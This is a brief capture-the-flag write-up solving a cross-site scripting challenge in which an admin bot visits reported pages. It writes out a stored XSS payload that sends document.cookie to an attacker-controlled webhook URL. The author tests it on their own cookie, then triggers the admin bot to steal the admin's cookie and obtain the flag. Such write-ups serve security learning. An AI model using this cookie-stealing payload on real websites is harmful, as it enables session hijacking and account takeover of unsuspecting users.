The description says that its an upgraded version of the "My First XSS" challenge and can report to admin.<br>
<br><img width="529" alt="image" src="https://user-images.githubusercontent.com/79892065/160345480-c18b3207-b5b6-4109-b487-83d365e534f0.png"><br>
<br>Reporting to admin, probably trying to steal admin cookies?
<br>https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/
<br>We can create a webhook in https:/webhook.site
<br>We can also create a payload in the add comment ``<script>document.write('<img src="[WEBHOOKURL]?c='+document.cookie+'" />');</script>``<br>
<br><img width="801" alt="image" src="https://user-images.githubusercontent.com/79892065/160345806-c545f1c2-3dca-4f28-aeca-dd418d3e6e62.png"><br>
<br>Pasting the webhook url in the payload, and submit the payload to the server
<br>After we reload the website, we see the unloaded image<br>
<br><img width="845" alt="image" src="https://user-images.githubusercontent.com/79892065/160345956-a2b48fce-1ea0-4c3a-917b-3442b0f7489f.png"><br>
<br>And checking the webhook site we see it worked! It's successfully stealed our user cookie
<br>We can now press on the "Report Admin" button and the bot should visit the website to let our webhook site steal the cookie
<br><img width="797" alt="image" src="https://user-images.githubusercontent.com/79892065/160346340-301a8522-88a5-4e65-b1b7-99d40e47c05c.png"><br>
<br>And we got the flag!
